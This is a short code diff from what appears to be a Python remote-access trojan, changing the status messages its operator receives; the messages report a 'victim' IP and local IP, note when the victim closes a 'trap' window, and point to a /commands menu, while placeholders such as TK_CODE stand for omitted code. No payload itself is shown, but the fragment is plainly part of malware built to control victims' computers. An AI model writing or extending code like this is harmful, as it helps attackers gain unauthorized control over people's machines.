@@ -386,8 +386,9 @@ if check_internret():
             except: 
                 send_msg("start() function error. try again...")
                 continue
-    send_msg(f"Connected to victim with {ip}(local: {local_ip}) at {strftime("%H:%M:%S")}(Wait for closing trap. write /commands for help).")
+    send_msg(f"Connected to victim with {ip}(local: {local_ip}) at {strftime("%H:%M:%S")}. Whene trap close I will notif you.")
 TK_CODE
+    send_msg(f"Victim is closed trap at {strftime("%H:%M:%S")}(write /commands for help).")
     start()
 else:
 OFFLINE_TKINTER_CODE
